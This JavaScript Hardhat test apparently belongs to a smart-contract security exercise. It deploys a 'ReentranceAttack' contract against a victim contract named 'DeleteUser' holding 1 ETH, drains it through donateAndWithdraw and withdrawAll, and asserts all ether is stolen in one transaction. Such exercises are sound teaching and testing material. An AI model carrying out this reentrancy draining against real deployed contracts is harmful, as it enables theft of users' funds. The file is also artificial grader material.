const {
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DeleteUser";

describe(NAME, function () {
  async function setup() {
    const [owner, attackerWallet] = await ethers.getSigners();

    const VictimFactory = await ethers.getContractFactory(NAME);
    const victimContract = await VictimFactory.deploy();
    await victimContract.deposit({ value: ethers.utils.parseEther("1") });

    return { victimContract, attackerWallet };
  }

  describe("exploit", async function () {
    let victimContract, attackerWallet;
    before(async function () {
      ({ victimContract, attackerWallet } = await loadFixture(setup));
    });

    it("conduct your attack here", async function () {
      const ReentranceAttackFactory = await ethers.getContractFactory("ReentranceAttack");
      const reentrabceAttackContract = await ReentranceAttackFactory.deploy(victimContract.address);
      await reentrabceAttackContract.donateAndWithdraw(0);
      await reentrabceAttackContract.withdrawAll();

      const victimBalance = await ethers.provider.getBalance(victimContract.address);
      expect(victimBalance).to.equal(0,"All eth should be stolen");
    });

    after(async function () {
      expect(
        await ethers.provider.getBalance(victimContract.address)
      ).to.be.equal(0);
      expect(
        await ethers.provider.getTransactionCount(attackerWallet.address)
      ).to.equal(1, "must exploit one transaction");
    });
  });
});
